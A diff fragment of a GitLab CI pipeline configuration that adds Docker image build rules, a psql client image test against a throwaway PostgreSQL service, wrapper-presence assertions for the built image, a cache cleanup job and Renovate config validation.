+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH # for branch `develop` run if there were changes on the branch
+      exists:
+        - Dockerfile.emscripten
+      changes:
+        paths:
+          - Dockerfile.emscripten
+          - docker-bake.hcl
+          - pnpm-config/.npmrc
+          - pnpm-config/pnpm-workspace.yaml
+          - scripts/python/pnpm-catalog-manifest.py
+          - scripts/bash/npm-helpers/*
+          - scripts/bash/emscripten/*
+          - scripts/bash/emscripten/**/*
+          - scripts/bash/build_emscripten_image.sh
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH # for other branches compare to `develop` and run if there are differences
+      exists:
+        - Dockerfile.emscripten
+      changes:
+        paths:
+          - Dockerfile.emscripten
+          - docker-bake.hcl
+          - pnpm-config/.npmrc
+          - pnpm-config/pnpm-workspace.yaml
+          - scripts/python/pnpm-catalog-manifest.py
+          - scripts/bash/npm-helpers/*
+          - scripts/bash/emscripten/*
+          - scripts/bash/emscripten/**/*
+          - scripts/bash/build_emscripten_image.sh
+        compare_to: 'refs/heads/develop'
+
+build_psql_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "psql"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH # for branch main run if there were changes on the branch
+      exists:
+        - Dockerfile.psql
+      changes:
+        paths:
+          - Dockerfile.psql
+          - docker-bake.hcl
+          - haf-app-tools/scripts/run_with_reconnect.sh
+          - haf-app-tools/scripts/install_with_app_lock.py
+          - haf-app-tools/scripts/haf_app_driver.py
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH # for other branches compare to develop and run if there are diffrences
+      exists:
+        - Dockerfile.psql
+      changes:
+        paths:
+          - Dockerfile.psql
+          - docker-bake.hcl
+          - haf-app-tools/scripts/run_with_reconnect.sh
+          - haf-app-tools/scripts/install_with_app_lock.py
+          - haf-app-tools/scripts/haf_app_driver.py
+        compare_to: 'refs/heads/develop'
+
+# Exercises the psql client image. Normally the published version tag; when the
+# image sources changed on this branch, the image build_psql_image just pushed
+# for this commit (the version tag is only published from the default branch,
+# so a version bump could never pass otherwise).
+psql_image_test:
+  stage: test
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: on_success
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      changes:
+        paths:
+          - Dockerfile.psql
+          - docker-bake.hcl
+          - haf-app-tools/scripts/run_with_reconnect.sh
+          - haf-app-tools/scripts/install_with_app_lock.py
+          - haf-app-tools/scripts/haf_app_driver.py
+      variables:
+        PSQL_TEST_IMAGE: $CI_REGISTRY_IMAGE/psql:$CI_COMMIT_SHA
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      changes:
+        paths:
+          - Dockerfile.psql
+          - docker-bake.hcl
+          - haf-app-tools/scripts/run_with_reconnect.sh
+          - haf-app-tools/scripts/install_with_app_lock.py
+          - haf-app-tools/scripts/haf_app_driver.py
+        compare_to: 'refs/heads/develop'
+      variables:
+        PSQL_TEST_IMAGE: $CI_REGISTRY_IMAGE/psql:$CI_COMMIT_SHA
+    - when: on_success
+  # ONE variables block. An earlier revision declared PSQL_TEST_IMAGE in its own
+  # `variables:` above `image:` and the PostgreSQL settings in a second one below
+  # `services:`; YAML keeps the last duplicate key, so the default image silently
+  # vanished and any pipeline whose rules did not set PSQL_TEST_IMAGE (tag
+  # pipelines, develop pushes not touching the psql sources) ran on the runner's
+  # default image with no psql on it (1.29.0-rc2 tag pipeline: "psql: not found").
+  variables:
+    PSQL_TEST_IMAGE: registry.gitlab.syncad.com/hive/common-ci-configuration/psql:14-4
+    POSTGRES_DB: haf
+    POSTGRES_USER: haf_admin
+    POSTGRES_PASSWORD: password
+    POSTGRES_HOST_AUTH_METHOD: trust
+    PGHOST: postgres
+    PGPORT: 5432
+    PGDATABASE: $POSTGRES_DB
+    PGUSER: $POSTGRES_USER
+    PGPASSWORD: $POSTGRES_PASSWORD
+    CI_DEBUG_SERVICES: "false"
+  image:
+    name: $PSQL_TEST_IMAGE
+    entrypoint: [""]
+  services:
+    - postgres:14
+  script:
+    - |
+      set -e
+
+      psql --command="\conninfo"
+      psql --list
+      psql --command="\set"
+  tags:
+    - public-runner-docker
+
+# Verifies that the freshly-built psql image actually contains the
+# install_with_app_lock.py wrapper, python3, and psycopg2 -- so that HAF apps
+# building FROM this image can rely on the advisory-lock skip path working.
+# Catches: someone removing the COPY line, dropping py3-psycopg2/python3 from
+# apk add, or breaking the wrapper script itself. Runs only when
+# build_psql_image runs (rules track the same source paths).
+psql_image_assert_wrapper:
+  stage: test
+  image:
+    name: $CI_REGISTRY_IMAGE/psql:$CI_COMMIT_SHA
+    entrypoint: [""]
+  needs:
+    - job: build_psql_image
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.psql
+      changes:
+        paths:
+          - Dockerfile.psql
+          - docker-bake.hcl
+          - haf-app-tools/scripts/run_with_reconnect.sh
+          - haf-app-tools/scripts/install_with_app_lock.py
+          - haf-app-tools/scripts/haf_app_driver.py
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.psql
+      changes:
+        paths:
+          - Dockerfile.psql
+          - docker-bake.hcl
+          - haf-app-tools/scripts/run_with_reconnect.sh
+          - haf-app-tools/scripts/install_with_app_lock.py
+          - haf-app-tools/scripts/haf_app_driver.py
+        compare_to: 'refs/heads/develop'
+  script:
+    - |
+      set -e
+      echo "=== Wrapper file present? ==="
+      test -f /usr/local/bin/install_with_app_lock.py || { echo "FAIL: /usr/local/bin/install_with_app_lock.py missing"; exit 1; }
+      echo "OK"
+      echo "=== Block-processing driver present and importable? ==="
+      test -x /usr/local/bin/haf_app_driver.py || { echo "FAIL: /usr/local/bin/haf_app_driver.py missing"; exit 1; }
+      haf_app_driver.py --help > /dev/null || { echo "FAIL: haf_app_driver.py --help failed"; exit 1; }
+      echo "OK"
+
+      echo "=== python3 available? ==="
+      command -v python3 >/dev/null || { echo "FAIL: python3 not in PATH"; exit 1; }
+      python3 --version
+      echo "OK"
+
+      echo "=== psycopg2 importable? ==="
+      python3 -c "import psycopg2; print(f'psycopg2 {psycopg2.__version__}')" \
+        || { echo "FAIL: psycopg2 not importable"; exit 1; }
+      echo "OK"
+
+      echo "=== Wrapper script imports cleanly? ==="
+      python3 -c "
+      import importlib.util, sys
+      spec = importlib.util.spec_from_file_location('w', '/usr/local/bin/install_with_app_lock.py')
+      mod = importlib.util.module_from_spec(spec)
+      spec.loader.exec_module(mod)
+      assert hasattr(mod, 'main'), 'wrapper has no main()'
+      print('wrapper loaded; main() found')
+      " || { echo "FAIL: wrapper script has Python errors"; exit 1; }
+      echo "OK"
+
+      echo "=== All wrapper-presence assertions PASSED ==="
+  tags:
+    - public-runner-docker
+
+buildkit_cache_cleanup:
+  stage: cleanup
+  extends: .buildkit_cleanup_job_template
+  allow_failure: true
+  # Don't use needs: [] - let it wait for build stage to complete
+  # Otherwise it runs concurrently with builds and overloads the registry
+  rules:
+    - *skip_on_renovate_rule
+    - !reference [.buildkit_cleanup_job_template, rules]
+  variables:
+    # Use latest tag since the image may not be built in this pipeline (change detection)
+    IMAGE_REMOVER_TAG: latest
+    CACHE_REPOSITORIES: "benchmark-test-runner/cache,docker-builder/cache,docker-dind/cache,haf-app-test-runner/cache,python-scripts/cache,nginx/cache,dockerfile/cache,postgrest/cache,python/cache,ci-base-image/cache,ci-base-image-ubuntu/cache,python-test-tools/cache,node-test-tools/cache,node-test-tools-pg/cache,node-test-tools-browser/cache"
+
+# =============================================================================
+# Renovate Bot
+# =============================================================================
+
+.base_renovate:
+  image: renovate/renovate:43.31
+
+validate_renovate_config:
+  extends:
+    - .validation_job
+    - .base_renovate
+  script:
+    - |
+      for config in renovate/*.json5; do
+        echo "Validating $config..."
+        renovate-config-validator "$config"
+      done
+  rules:
+    - *skip_on_renovate_rule
+    - if: $CI_COMMIT_REF_PROTECTED == "true"
+      changes:
+        paths:
+          - renovate/*.json5
+    - if: $CI_COMMIT_BRANCH
+      changes:
+        paths:
+          - renovate/*.json5
+        compare_to: 'refs/heads/develop'
+
